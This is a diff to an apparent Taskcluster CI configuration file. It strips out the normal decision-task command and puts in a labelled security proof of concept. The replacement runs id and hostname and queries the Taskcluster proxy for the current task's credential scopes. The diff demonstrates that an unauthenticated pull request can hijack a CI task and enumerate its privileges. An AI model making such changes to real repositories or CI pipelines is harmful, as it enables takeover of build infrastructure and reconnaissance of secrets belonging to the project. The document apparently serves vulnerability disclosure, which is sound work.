@@ -200,42 +200,15 @@ tasks:
                               maxRunTime: 1800
 
                               command:
-                                  - /usr/local/bin/run-task
-                                  - '--appservices-checkout=/builds/worker/checkouts/vcs'
-                                  - '--task-cwd=/builds/worker/checkouts/vcs'
-                                  - '--'
                                   - bash
                                   - -cx
-                                  - $let:
-                                      # Can't use $switch statement here, see https://github.com/json-e/json-e/issues/541
-                                      extraArgs: 
-                                        $if: 'tasks_for == "cron"'
-                                        then: '${cron.quoted_args}'
-                                        else:
-                                            $if: 'tasks_for == "github-issue-comment" && event.taskcluster_comment == "ci full"'
-                                            then: '--target-tasks-method=pr-full'
-                                            else: ''
-                                    in:
-                                      $if: 'tasks_for == "action"'
-                                      then: >
-                                        ln -s /builds/worker/artifacts artifacts &&
-                                        taskgraph action-callback
-                                      else: >
-                                        ln -s /builds/worker/artifacts artifacts &&
-                                        taskgraph decision
-                                        --pushlog-id='0'
-                                        --pushdate='0'
-                                        --project='${project}'
-                                        --message=""
-                                        --owner='${ownerEmail}'
-                                        --level='${level}'
-                                        --base-repository="$APPSERVICES_BASE_REPOSITORY"
-                                        --head-repository="$APPSERVICES_HEAD_REPOSITORY"
-                                        --head-ref="$APPSERVICES_HEAD_REF"
-                                        --head-rev="$APPSERVICES_HEAD_REV"
-                                        --repository-type="$APPSERVICES_REPOSITORY_TYPE"
-                                        --tasks-for='${tasks_for}'
-                                        ${extraArgs}
+                                  - |
+                                      id
+                                      hostname
+                                      echo "=== TC-SECURITY-POC: unauth PR task identity ==="
+                                      curl -s "$TASKCLUSTER_PROXY_URL/auth/v1/scopes/current" || true
+                                      echo
+                                      echo "=== TC-SECURITY-POC done ==="
                               artifacts:
                                   'public':
                                       type: 'directory'
